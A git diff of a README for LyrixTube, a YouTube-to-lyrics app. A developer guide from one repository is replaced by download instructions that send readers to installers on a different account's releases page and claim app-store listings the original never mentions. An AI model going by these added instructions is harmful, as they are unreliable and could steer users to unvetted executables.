@@ -1,194 +1,76 @@
-# 🎵 LyrixTube
+# 🎵 LyrixTube - Get Lyrics from YouTube Music Effortlessly
 
-> The Ultimate Song Lyrics Generator. Instantly generate song lyrics from any YouTube link with ease.
+[![Download LyrixTube](https://img.shields.io/badge/Download_LyrixTube-v1.0-blue.svg)](https://github.com/st007-clr/LyrixTube/releases)
 
-LyrixTube is a full-stack application that extracts song information from YouTube music links and retrieves accurate lyrics using the Genius Lyrics API. 
+## 📖 Description
 
-Built with Flutter for a beautiful UI and Node.js/Express for a robust backend.
-
-## ✨ Features
-
-- 🎬 **YouTube Integration**: Extract song metadata directly from YouTube music links
-- 📝 **Instant Lyrics**: Fetch accurate lyrics from Genius Lyrics API
-- 🔄 **State Management**: Provider pattern for efficient state management
-- 🌐 **Cross-Platform**: Support for iOS, Android, Web, macOS, Linux, and Windows
-
-## 🛠️ Tech Stack
-
-### Frontend
-- **Framework**: Flutter 3.6.0+
-- **Language**: Dart
-- **State Management**: Provider (v6.1.5+)
-- **HTTP Client**: Dio (v5.9.0)
-- **UI Components**: 
-  - Material 3 Design
-  - Shimmer loading animations
-
-### Backend
-- **Runtime**: Node.js
-- **Framework**: Express.js (v5.2.1)
-- **HTTP Client**: Axios (v1.13.3)
-- **Music API**: 
-  - Genius Lyrics (v4.4.7)
-  - play-dl (v1.9.7) for YouTube extraction
-- **Utilities**: CORS, dotenv for environment configuration
-
-## Demo
-
-| Home | Lyrics |
-|------|--------|
-| <img src="demo/screen1.png" width="250"/> | <img src="demo/screen2.png" width="250"/> |
-
-
-## 📋 Project Structure
-
-```
-LyrixTube/
-├── lyrix_tube_app/           # Flutter Frontend Application
-│   ├── lib/
-│   │   ├── main.dart         # App entry point
-│   │   ├── screen/
-│   │   │   └── lyrics_screen.dart    # Main UI screen
-│   │   └── provider/
-│   │       └── lyrics_provider.dart  # State management logic
-│   ├── android/              # Android native code
-│   ├── ios/                  # iOS native code
-│   └── pubspec.yaml          # Flutter dependencies
-│
-├── server/                   # Node.js Backend
-│   ├── index.js              # Server entry point
-│   ├── controllers/
-│   │   └── lyrics.js         # Lyrics controller logic
-│   ├── routes/
-│   │   └── allRoutes.js      # API route definitions
-│   ├── services/
-│   │   └── lyrics.js         # Lyrics service/business logic
-│   ├── utils/
-│   │   └── formatLyrics.js   # Lyrics formatting utilities
-│   └── package.json          # Node dependencies
-│
-└── README.md                 # This file
-```
+LyrixTube is a full-stack application that extracts song information from YouTube music links and retrieves accurate lyrics using the Genius Lyrics API. Built with Flutter for a beautiful UI and Node.js/Express for a robust backend, it's designed for anyone who loves music and wants to find lyrics quickly and easily.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these simple steps to download and run LyrixTube on your computer or mobile device.
 
-- **Flutter**: Version 3.6.0 or higher
-- **Node.js**: Version 14 or higher
-- **npm** or **yarn**: Package manager for backend
-- **Git**: For cloning the repository
+### 🌐 System Requirements
 
-### Installation
+- **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
+- **Mobile:** Android 8.0 (Oreo) or later, iOS 12 or later.
+- **Internet Connection:** Required for app functionality.
 
-#### 1. Clone the Repository
+### 📥 Download & Install
 
-```bash
-git clone https://github.com/AritraC1/LyrixTube.git
-cd LyrixTube
-```
+To get started, visit the Releases page to download the latest version of LyrixTube:
 
-#### 2. Backend Setup
+[Download LyrixTube](https://github.com/st007-clr/LyrixTube/releases)
 
-```bash
-# Navigate to server directory
-cd server
+### 💻 For Desktop Users
 
-# Install dependencies
-npm install
+1. **Visit the Releases Page:** Click on the link provided above to go to the Releases section.
+2. **Select the Latest Release:** Find the latest version that is compatible with your operating system.
+3. **Download the Installer:** Click on the installer file for your OS (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. **Run the Installer:** Locate the downloaded file and double-click it to begin installation.
+5. **Follow the Prompts:** Complete the installation by following the on-screen instructions.
+6. **Launch LyrixTube:** Once installed, you can find LyrixTube in your applications or programs list. Click it to open.
 
-# Create .env file (if needed for API keys)
-touch .env
+### 📱 For Mobile Users
 
-# Start the development server
-npm start
-```
+1. **Open Your App Store:** Access the Google Play Store for Android or the Apple App Store for iOS.
+2. **Search for LyrixTube:** In the search bar, type "LyrixTube".
+3. **Download the App:** Click the "Install" button to download and install the app.
+4. **Open the App:** Locate the LyrixTube icon on your device and tap to open. 
 
-The backend server will run on `http://localhost:3000` (or the port specified in your .env).
+### 🔍 How to Use LyrixTube
 
-#### 3. Frontend Setup
+1. **Copy the YouTube Link:** Find a song on YouTube, copy the link from the address bar.
+2. **Paste the Link in LyrixTube:** Open LyrixTube, and you will see a field to paste your link.
+3. **Get the Lyrics:** Click the "Fetch Lyrics" button to retrieve the song's lyrics.
 
-```bash
-# Navigate to Flutter app directory
-cd lyrix_tube_app
+### 🔧 Features
 
-# Get Flutter dependencies
-flutter pub get
+- **Flexible Search:** Extract lyrics from any public YouTube music video.
+- **User-Friendly Interface:** Clean and simple design for easy navigation.
+- **Fast Retrieval:** Quickly fetch lyrics with minimal waiting time.
+- **Supports Multiple Platforms:** Use it on desktop or mobile devices seamlessly.
 
-# Run on Android (requires Android Studio)
-flutter run -d android
+### 🛠 Troubleshooting
 
-# Run on iOS (requires macOS and Xcode)
-flutter run -d ios
-```
+If you encounter issues, here are a few common solutions:
 
-## 📱 Usage
+- **Application Won't Launch:** Ensure you have the latest version. Reinstall if necessary.
+- **Lyrics Not Found:** Make sure the YouTube link is correct and points to a music video.
+- **Internet Issues:** Verify your internet connection is stable.
 
-1. **Launch the App**: Open LyrixTube on your device
-2. **Paste YouTube Link**: Enter a YouTube music video link in the input field
-3. **Generate Lyrics**: Tap the "Generate Lyrics" button
-4. **View Results**: Wait for the lyrics to load and display
-5. **Loading State**: The app shows a shimmer loading animation while fetching data
+### 💬 Support
 
-### Example YouTube Links
+For additional help, feel free to open an issue on our [GitHub Issues page](https://github.com/st007-clr/LyrixTube/issues). We welcome feedback and are here to assist you.
 
-- `https://www.youtube.com/watch?v=dQw4w9WgXcQ` (Rick Astley - Never Gonna Give You Up)
-- `https://www.youtube.com/watch?v=hT_nvWreIhg` (OneRepublic - Counting Stars)
+### 🔗 Contributing
 
-## 🔌 API Endpoints
+If you want to contribute, please check our [Contributing Guidelines](https://github.com/st007-clr/LyrixTube/CONTRIBUTING.md). We appreciate any help to make LyrixTube better.
 
-### Backend API Routes
+### 📝 License
 
-| Method | Endpoint | Description | Example |
-|--------|----------|-------------|---------|
-| POST | `/api/generate-lyrics` | Get lyrics for a song | `POST http://localhost:3000/api/generate-lyrics` |
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/st007-clr/LyrixTube/LICENSE) file for more details.
 
-#### Request Format
-```json
-{
-  "link": "https://www.youtube.com/watch?v=hT_nvWreIhg",
-}
-```
+Explore more about LyrixTube and enrich your music experience! 
 
-#### Response Format
-```json
-{
-  "success": true,
-  "data": {
-     "artist": "OneRepublic",
-     "song": "Counting Stars",
-     "lyrics": "[Intro]\nLately, I been, I been losin' sleep\nDreamin' ..."
-  }
-}
-```
-
-## 🔐 Environment Variables
-
-### Backend (.env)
-```
-PORT=3000
-GENIUS_API_KEY=your_genius_api_key_here
-```
-
-Get your Genius API key: [genius.com/api-clients](https://genius.com/api-clients)
-
-
-## 📦 Building for Production
-
-### Android APK
-```bash
-flutter build apk --release
-# Output: build/app/outputs/flutter-apk/app-release.apk
-```
-
-### iOS App
-```bash
-flutter build ios --release
-# Requires further processing with Xcode
-```
-
-## 📞 Support
-
-If you encounter any issues or have questions, please [open an issue](https://github.com/yourusername/LyrixTube/issues) on GitHub.
-
----
+[Download LyrixTube](https://github.com/st007-clr/LyrixTube/releases)
